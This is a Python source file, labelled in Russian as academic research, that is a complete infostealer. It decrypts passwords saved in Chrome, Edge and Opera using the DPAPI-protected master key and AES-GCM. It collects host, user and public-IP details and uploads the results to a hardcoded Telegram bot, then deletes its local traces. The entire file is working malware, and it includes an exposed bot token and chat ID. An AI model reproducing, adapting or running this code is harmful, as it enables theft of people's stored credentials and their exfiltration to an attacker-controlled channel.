#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
ОДИН ФАЙЛ - Сбор логинов, паролей и URL из браузеров
Проект ОЛИМП - Академическое исследование
"""

import os
import sys
import json
import sqlite3
import shutil
import base64
import tempfile
import datetime
import urllib.request
import urllib.parse
import glob
import mimetypes
import platform
import ctypes

# Проверка и установка недостающих модулей
try:
    import win32crypt
except ImportError:
    print("[*] Устанавливаем pywin32...")
    os.system(f'"{sys.executable}" -m pip install pywin32')
    import win32crypt

try:
    from Crypto.Cipher import AES
except ImportError:
    print("[*] Устанавливаем pycryptodome...")
    os.system(f'"{sys.executable}" -m pip install pycryptodome')
    from Crypto.Cipher import AES

# ==================== КОНФИГУРАЦИЯ ====================
TOKEN = "8437378150:AAFB87wLIvsS54b5DuQcKdXleCTLfvnJNcM"
CHAT_ID = "7944445332"
# ======================================================

class TelegramExfiltrator:
    """Отправка данных через Telegram Bot API"""
    
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send_file(self, file_path, caption=""):
        """Отправка файла"""
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Создаем multipart/form-data
            boundary = '----WebKitFormBoundary' + base64.b64encode(os.urandom(12)).decode()
            
            body = []
            
            # Chat ID
            body.append(f'--{boundary}'.encode())
            body.append('Content-Disposition: form-data; name="chat_id"'.encode())
            body.append(b'')
            body.append(str(self.chat_id).encode())
            
            # Caption
            body.append(f'--{boundary}'.encode())
            body.append('Content-Disposition: form-data; name="caption"'.encode())
            body.append(b'')
            body.append(caption.encode())
            
            # File
            filename = os.path.basename(file_path)
            mime_type = mimetypes.guess_type(filename)[0] or 'text/plain'
            
            body.append(f'--{boundary}'.encode())
            body.append(f'Content-Disposition: form-data; name="document"; filename="{filename}"'.encode())
            body.append(f'Content-Type: {mime_type}'.encode())
            body.append(b'')
            body.append(file_data)
            
            # End boundary
            body.append(f'--{boundary}--'.encode())
            body.append(b'')
            
            # Join all parts
            data = b'\r\n'.join(body)
            
            # Send request
            url = f"{self.base_url}/sendDocument"
            req = urllib.request.Request(url, data=data, method='POST')
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            req.add_header('Content-Length', str(len(data)))
            
            response = urllib.request.urlopen(req, timeout=30)
            return response.getcode() == 200
            
        except Exception as e:
            print(f"[!] Ошибка отправки: {e}")
            return False
    
    def send_message(self, text):
        """Отправка текстового сообщения"""
        try:
            data = urllib.parse.urlencode({
                'chat_id': self.chat_id,
                'text': text[:4096]
            }).encode()
            
            url = f"{self.base_url}/sendMessage"
            req = urllib.request.Request(url, data=data, method='POST')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            response = urllib.request.urlopen(req, timeout=15)
            return response.getcode() == 200
            
        except Exception:
            return False


class ChromiumDecryptor:
    """Дешифровка паролей из Chromium-браузеров"""
    
    @staticmethod
    def get_secret_key(local_state_path):
        """Извлечение мастер-ключа"""
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(
                local_state['os_crypt']['encrypted_key']
            )
            
            # Удаляем префикс 'DPAPI'
            encrypted_key = encrypted_key[5:]
            
            # Дешифровка через DPAPI
            secret_key = win32crypt.CryptUnprotectData(
                encrypted_key, None, None, None, 0
            )[1]
            
            return secret_key
        except Exception:
            return None
    
    @staticmethod
    def decrypt_password(encrypted_password, key):
        """Дешифровка пароля"""
        try:
            if len(encrypted_password) == 0:
                return ""
            
            # Старый формат (до Chrome 80)
            if encrypted_password.startswith(b'\x01\x00\x00\x00'):
                decrypted = win32crypt.CryptUnprotectData(
                    encrypted_password, None, None, None, 0
                )[1]
                return decrypted.decode('utf-8', errors='ignore')
            
            # Новый формат AES-GCM (Chrome 80+)
            try:
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8', errors='ignore')
            except:
                # Альтернативный метод
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt(ciphertext)
                return decrypted.decode('utf-8', errors='ignore').rstrip('\x00')
                
        except Exception as e:
            return f"[Ошибка]"


class BrowserStealer:
    """Универсальный класс для сбора данных из браузеров"""
    
    @staticmethod
    def get_chrome_passwords():
        """Пароли из Chrome"""
        results = []
        chrome_base = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
        local_state = os.path.join(chrome_base, "Local State")
        
        if not os.path.exists(local_state):
            return results
        
        key = ChromiumDecryptor.get_secret_key(local_state)
        if not key:
            return results
        
        # Ищем все профили
        profiles = glob.glob(os.path.join(chrome_base, "Default")) + \
                   glob.glob(os.path.join(chrome_base, "Profile *"))
        
        for profile in profiles:
            login_db = os.path.join(profile, "Login Data")
            if os.path.exists(login_db):
                temp_dir = tempfile.mkdtemp()
                temp_db = os.path.join(temp_dir, "Login Data")
                
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT origin_url, username_value, password_value
                        FROM logins
                        WHERE username_value != '' AND password_value != ''
                    """)
                    
                    for row in cursor.fetchall():
                        url, username, enc_pass = row
                        if username and enc_pass:
                            password = ChromiumDecryptor.decrypt_password(enc_pass, key)
                            results.append({
                                'browser': 'Chrome',
                                'url': url,
                                'username': username,
                                'password': password
                            })
                    
                    conn.close()
                except:
                    pass
                finally:
                    try:
                        shutil.rmtree(temp_dir)
                    except:
                        pass
        
        return results
    
    @staticmethod
    def get_edge_passwords():
        """Пароли из Edge"""
        results = []
        edge_base = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")
        local_state = os.path.join(edge_base, "Local State")
        
        if not os.path.exists(local_state):
            return results
        
        key = ChromiumDecryptor.get_secret_key(local_state)
        if not key:
            return results
        
        profiles = glob.glob(os.path.join(edge_base, "Default")) + \
                   glob.glob(os.path.join(edge_base, "Profile *"))
        
        for profile in profiles:
            login_db = os.path.join(profile, "Login Data")
            if os.path.exists(login_db):
                temp_dir = tempfile.mkdtemp()
                temp_db = os.path.join(temp_dir, "Login Data")
                
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT origin_url, username_value, password_value
                        FROM logins
                        WHERE username_value != '' AND password_value != ''
                    """)
                    
                    for row in cursor.fetchall():
                        url, username, enc_pass = row
                        if username and enc_pass:
                            password = ChromiumDecryptor.decrypt_password(enc_pass, key)
                            results.append({
                                'browser': 'Edge',
                                'url': url,
                                'username': username,
                                'password': password
                            })
                    
                    conn.close()
                except:
                    pass
                finally:
                    try:
                        shutil.rmtree(temp_dir)
                    except:
                        pass
        
        return results
    
    @staticmethod
    def get_opera_passwords():
        """Пароли из Opera"""
        results = []
        opera_base = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")
        local_state = os.path.join(opera_base, "Local State")
        
        if not os.path.exists(local_state):
            return results
        
        key = ChromiumDecryptor.get_secret_key(local_state)
        if not key:
            return results
        
        login_db = os.path.join(opera_base, "Login Data")
        if os.path.exists(login_db):
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "Login Data")
            
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT origin_url, username_value, password_value
                    FROM logins
                    WHERE username_value != '' AND password_value != ''
                """)
                
                for row in cursor.fetchall():
                    url, username, enc_pass = row
                    if username and enc_pass:
                        password = ChromiumDecryptor.decrypt_password(enc_pass, key)
                        results.append({
                            'browser': 'Opera',
                            'url': url,
                            'username': username,
                            'password': password
                        })
                
                conn.close()
            except:
                pass
            finally:
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
        
        return results
    
    @staticmethod
    def get_system_info():
        """Системная информация"""
        info = {}
        try:
            info["Hostname"] = platform.node()
            info["OS"] = platform.platform()
            info["Username"] = os.getenv("USERNAME", "")
            info["Computer"] = os.getenv("COMPUTERNAME", "")
            
            # IP адрес
            try:
                ip_response = urllib.request.urlopen("https://api.ipify.org", timeout=5)
                info["Public IP"] = ip_response.read().decode()
            except:
                info["Public IP"] = "Не удалось получить"
            
            # Время работы
            try:
                lib = ctypes.windll.kernel32
                t = lib.GetTickCount64()
                days = t // (24 * 3600 * 1000)
                hours = (t % (24 * 3600 * 1000)) // (3600 * 1000)
                info["Uptime"] = f"{days}д {hours}ч"
            except:
                pass
            
        except Exception as e:
            info["Error"] = str(e)
        
        return info


def main():
    """Главная функция"""
    try:
        print("=" * 60)
        print("  СБОР ДАННЫХ ИЗ БРАУЗЕРОВ")
        print("  Проект ОЛИМП - Академическое исследование")
        print("=" * 60)
        
        # Создаем временный файл
        temp_dir = tempfile.mkdtemp(prefix="browser_data_")
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = os.path.join(temp_dir, f"passwords_{timestamp}.txt")
        
        print(f"[*] Временный файл: {output_file}")
        
        # Собираем все данные
        all_passwords = []
        
        print("[*] Сбор паролей из Chrome...")
        all_passwords.extend(BrowserStealer.get_chrome_passwords())
        
        print("[*] Сбор паролей из Edge...")
        all_passwords.extend(BrowserStealer.get_edge_passwords())
        
        print("[*] Сбор паролей из Opera...")
        all_passwords.extend(BrowserStealer.get_opera_passwords())
        
        # Получаем системную информацию
        sys_info = BrowserStealer.get_system_info()
        
        # Сохраняем в файл
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("СИСТЕМНАЯ ИНФОРМАЦИЯ\n")
            f.write("=" * 80 + "\n")
            for key, value in sys_info.items():
                f.write(f"{key}: {value}\n")
            
            f.write("\n" + "=" * 80 + "\n")
            f.write(f"НАЙДЕНО ПАРОЛЕЙ: {len(all_passwords)}\n")
            f.write("=" * 80 + "\n\n")
            
            for i, pwd in enumerate(all_passwords, 1):
                f.write(f"{i}. [{pwd['browser']}]\n")
                f.write(f"   URL: {pwd['url']}\n")
                f.write(f"   Логин: {pwd['username']}\n")
                f.write(f"   Пароль: {pwd['password']}\n")
                f.write("-" * 60 + "\n")
        
        print(f"[+] Собрано паролей: {len(all_passwords)}")
        print(f"[+] Файл сохранен: {output_file}")
        
        # Отправка в Telegram
        print("[*] Отправка в Telegram...")
        telegram = TelegramExfiltrator(TOKEN, CHAT_ID)
        
        # Отправляем файл
        caption = f"📁 Пароли | {len(all_passwords)} шт | {sys_info.get('Hostname', 'Unknown')}"
        if telegram.send_file(output_file, caption):
            print("[+] Файл отправлен")
            
            # Отправляем статистику
            stats = f"📊 Статистика:\n"
            stats += f"🖥 Хост: {sys_info.get('Hostname', 'Unknown')}\n"
            stats += f"👤 Пользователь: {sys_info.get('Username', 'Unknown')}\n"
            stats += f"🌐 IP: {sys_info.get('Public IP', 'Unknown')}\n"
            stats += f"🔑 Всего паролей: {len(all_passwords)}\n"
            
            browsers = {}
            for pwd in all_passwords:
                browsers[pwd['browser']] = browsers.get(pwd['browser'], 0) + 1
            
            stats += "📋 По браузерам:\n"
            for browser, count in browsers.items():
                stats += f"  • {browser}: {count}\n"
            
            telegram.send_message(stats)
            print("[+] Статистика отправлена")
        else:
            print("[-] Не удалось отправить файл")
        
        # Очистка
        try:
            os.remove(output_file)
            os.rmdir(temp_dir)
            print("[*] Временные файлы удалены")
        except:
            pass
        
        print("[+] Готово!")
        
    except Exception as e:
        print(f"[!] Ошибка: {e}")
        
        # Отправляем ошибку в Telegram
        try:
            telegram = TelegramExfiltrator(TOKEN, CHAT_ID)
            telegram.send_message(f"❌ Ошибка: {str(e)[:200]}")
        except:
            pass


if __name__ == "__main__":
    main()